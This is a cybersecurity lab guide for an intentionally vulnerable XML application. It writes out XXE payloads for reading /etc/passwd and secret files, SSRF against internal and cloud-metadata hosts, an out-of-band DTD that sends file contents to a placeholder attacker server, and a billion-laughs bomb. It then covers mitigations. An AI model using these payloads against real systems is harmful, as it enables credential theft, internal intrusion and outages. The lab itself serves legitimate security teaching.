# XXE Lab: Entity Smuggler - A WebSploit Labs Attack Simulation
*Created by Omar Santos for [WebSploit Labs](https://websploit.org/) - Cybersecurity Education*

[WebSploit Labs](https://websploit.org/) is a learning environment created by Omar Santos for different Cybersecurity Ethical Hacking, Bug Hunting, Incident Response, Digital Forensics, and Threat Hunting training sessions. WebSploit Labs includes several intentionally vulnerable applications running in Docker containers on top of Kali Linux or Parrot Security OS, several additional tools, and over 9,000 cybersecurity resources.

[WebSploit Labs](https://websploit.org/) has been used by many colleges and universities in different countries.

## 🎯 Learning Objectives
By completing this lab, students will learn to:
- Understand XML External Entity (XXE) vulnerabilities and their root causes
- Exploit XXE to read local files from the server
- Perform blind XXE attacks using out-of-band techniques
- Chain XXE with SSRF to access internal services
- Understand XXE mitigation strategies and secure XML parsing

## 📋 Prerequisites
- Basic understanding of XML structure and DTDs
- Familiarity with HTTP requests and web application testing
- Burp Suite or similar proxy tool (recommended)
- Basic knowledge of command-line tools (curl)

## 🚀 Lab Setup

### Install Dependencies
```bash
pip install -r requirements.txt
```

### Running the Application
```bash
# Run the XXE vulnerable application
python3 xxe_app.py
```

The application will be available at `http://localhost:5013`

### Docker Setup (Recommended)

```bash
# Build and run with Docker
docker build -t websploit-xxe .
docker run -p 5013:5013 websploit-xxe
```

Or use docker-compose from the root directory:
```bash
docker compose up -d entity-smuggler
```

## 🔍 Understanding XXE

**XML External Entity (XXE)** injection is a vulnerability that exploits insecure XML parsers. When an XML parser processes external entity references without proper restrictions, attackers can:

- **Read Local Files**: Access sensitive files like `/etc/passwd`, configuration files, source code
- **Server-Side Request Forgery (SSRF)**: Make requests to internal services
- **Port Scanning**: Probe internal network infrastructure
- **Denial of Service**: Execute "Billion Laughs" attacks to crash the server
- **Remote Code Execution**: In some cases, achieve RCE through PHP expect or similar extensions

### XML Entities Primer

XML supports entity declarations within the DOCTYPE:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY myentity "Hello World">
]>
<root>&myentity;</root>
```

**External entities** can reference files or URLs:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">
```

## 🧪 Testing Methodology

### Phase 1: Identification

#### 1.1 Identify XML Input Points
Navigate to `http://localhost:5013` and identify endpoints accepting XML:

- **XML Document Parser** (`/parse`)
- **User Registration** (`/register`)
- **Product Import** (`/import`)
- **Config Validator** (`/validate`)
- **SOAP Handler** (`/soap`)
- **XPath Query Engine** (`/xpath`)
- **API Endpoint** (`/api/xml`)

#### 1.2 Test for XML Processing
Verify the application parses XML by sending valid XML:

```bash
curl -X POST http://localhost:5013/parse \
  -d 'xml_data=<?xml version="1.0"?><test>hello</test>'
```

### Phase 2: Basic XXE Exploitation

#### 2.1 Classic File Read (XXE to LFI)

Read `/etc/passwd`:

```bash
curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>'
```

#### 2.2 Read Application Files

Attempt to read application configuration:

```bash
# Read simulated sensitive files
curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///app/config/database.conf">
]>
<data>&xxe;</data>'

curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///app/secrets/api_keys.txt">
]>
<data>&xxe;</data>'
```

#### 2.3 XXE via User Registration

Inject XXE through the registration form:

```bash
curl -X POST http://localhost:5013/register -d 'user_xml=<?xml version="1.0"?>
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<user>
    <username>&xxe;</username>
    <email>hacker@evil.com</email>
    <role>admin</role>
</user>'
```

#### 2.4 XXE via Product Import

```bash
curl -X POST http://localhost:5013/import -d 'product_xml=<?xml version="1.0"?>
<!DOCTYPE products [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
    <product id="001">
        <name>&xxe;</name>
        <price>0.00</price>
    </product>
</products>'
```

### Phase 3: Advanced XXE Techniques

#### 3.1 XXE to SSRF

Use XXE to make internal requests:

```bash
# Access internal services
curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://localhost:5013/health">
]>
<data>&xxe;</data>'

# Probe internal network (if running in Docker network)
curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://10.6.6.30:5010/">
]>
<data>&xxe;</data>'
```

#### 3.2 XXE with Parameter Entities

For reading files with special characters:

```bash
curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY xxe SYSTEM '"'"'file:///etc/passwd'"'"'>">
    %eval;
]>
<data>&xxe;</data>'
```

#### 3.3 Blind XXE (Out-of-Band)

When results are not directly reflected, use external DTD:

First, host an evil DTD (e.g., on your server):
```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%eval;
%exfil;
```

Then trigger:
```bash
curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd">
    %xxe;
]>
<data>test</data>'
```

#### 3.4 Error-Based XXE

Force errors to leak file contents:

```bash
curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '"'"'file:///nonexistent/%file;'"'"'>">
    %eval;
    %error;
]>
<data>test</data>'
```

#### 3.5 XXE via SOAP Endpoint

```bash
curl -X POST http://localhost:5013/soap -d 'soap_xml=<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetData>
            <param>&xxe;</param>
        </GetData>
    </soap:Body>
</soap:Envelope>'
```

### Phase 4: API Exploitation

#### 4.1 XXE via JSON API

```bash
# POST with XML content type
curl -X POST http://localhost:5013/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>'
```

### Phase 5: Denial of Service

#### 5.1 Billion Laughs Attack (XML Bomb)

⚠️ **WARNING**: This can crash the server. Use with caution!

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>&lol4;</data>
```

## 🔧 Testing with Burp Suite

### Intercepting and Modifying Requests
1. Configure browser to use Burp proxy
2. Submit normal XML via any form
3. Intercept the request in Burp
4. Add XXE payload to the XML
5. Forward and observe response

### Burp Collaborator for Blind XXE
1. Generate Collaborator payload
2. Use Collaborator URL in XXE SYSTEM entity
3. Monitor for DNS/HTTP callbacks

## 🎯 Specific Test Cases

### Test Case 1: Read /etc/passwd
```bash
# Objective: Confirm XXE vulnerability by reading system file
curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>'

# Expected: Contents of /etc/passwd displayed
```

### Test Case 2: Extract Database Credentials
```bash
# Objective: Read application secrets
curl -X POST http://localhost:5013/validate -d 'config_xml=<?xml version="1.0"?>
<!DOCTYPE config [<!ENTITY xxe SYSTEM "file:///app/config/database.conf">]>
<config><secret>&xxe;</secret></config>'
```

### Test Case 3: Internal Service Discovery
```bash
# Objective: Use XXE for SSRF
curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>'
```

### Test Case 4: PHP Wrapper (if PHP available)
```bash
# Objective: Read PHP source files
curl -X POST http://localhost:5013/parse -d 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&xxe;</data>'
```

## 🛡️ Detection and Mitigation

### Detection Techniques
1. **Log Analysis**: Monitor for unusual file:// or http:// requests in XML
2. **WAF Rules**: Block DTD declarations in XML input
3. **Anomaly Detection**: Alert on XML containing ENTITY declarations

### Mitigation Strategies

#### 1. Disable External Entities (Recommended)

**Python (lxml) - Secure Configuration:**
```python
from lxml import etree

# SECURE: Disable all external entity processing
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)
doc = etree.fromstring(xml_string.encode(), parser)
```

**Python (defusedxml) - Best Practice:**
```python
import defusedxml.ElementTree as ET

# defusedxml automatically blocks XXE
doc = ET.fromstring(xml_string)
```

**Java:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**PHP:**
```php
libxml_disable_entity_loader(true);
```

#### 2. Input Validation
- Reject XML containing DOCTYPE declarations
- Whitelist expected XML structure

#### 3. Use Less Complex Data Formats
- Consider JSON instead of XML where possible
- JSON is not vulnerable to XXE

### Secure Code Example

```python
# SECURE XML PARSING
import defusedxml.ElementTree as ET

def parse_xml_secure(xml_string):
    """Securely parse XML - XXE attacks are blocked"""
    try:
        # defusedxml prevents XXE by default
        doc = ET.fromstring(xml_string)
        return ET.tostring(doc, encoding='unicode')
    except ET.ParseError as e:
        return f"Parse error: {e}"

# Alternative with lxml
from lxml import etree

def parse_xml_secure_lxml(xml_string):
    """Secure lxml parsing"""
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        load_dtd=False
    )
    doc = etree.fromstring(xml_string.encode(), parser)
    return etree.tostring(doc, encoding='unicode')
```

## 📊 Lab Report Template

### Vulnerability Summary
- **Vulnerability Type**: XML External Entity (XXE) Injection
- **Severity**: High to Critical
- **CWE**: CWE-611 (Improper Restriction of XML External Entity Reference)
- **CVSS Score**: 7.5 - 9.8 (depending on impact)

### Technical Details
- **Root Cause**: XML parser configured to resolve external entities
- **Attack Vectors**: DTD entity injection via XML input
- **Impact**: File disclosure, SSRF, DoS, potential RCE

### Proof of Concept
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### Remediation
1. Disable DTD processing entirely
2. Use defusedxml or similar secure parsing libraries
3. Implement input validation to reject DOCTYPE declarations
4. Consider using JSON instead of XML

## 🎓 Learning Questions

1. **Identification**: What indicators suggest an application might be vulnerable to XXE?

2. **Exploitation**: How would you exploit XXE if the response doesn't directly show the entity content?

3. **Impact**: What is the maximum impact of XXE in a cloud environment?

4. **Mitigation**: Why is disabling DTD processing the recommended fix rather than filtering DOCTYPE?

5. **Detection**: What log entries or network traffic patterns indicate XXE exploitation?

## 📚 Additional Resources

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security - XXE](https://portswigger.net/web-security/xxe)
- [OWASP Top 10 - A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

